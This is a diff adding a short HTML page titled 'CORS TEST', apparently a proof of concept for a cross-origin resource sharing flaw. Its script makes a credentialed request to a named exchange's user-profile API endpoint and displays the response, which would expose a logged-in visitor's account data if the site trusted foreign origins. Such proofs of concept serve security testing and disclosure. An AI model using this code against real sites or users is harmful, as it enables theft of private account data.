@@ -1,0 +1,19 @@
+<html>
+<head>
+<title>CORS</title>
+</head>
+<body>
+<p>CORS TEST</p>
+</body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+  if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+    alert(xhr.responseText);
+  }
+}
+xhr.open('GET', 'https://remitano.com/api/v1/users/me', true); 
+xhr.withCredentials = true; 
+xhr.send(null);
+</script>
+</html>
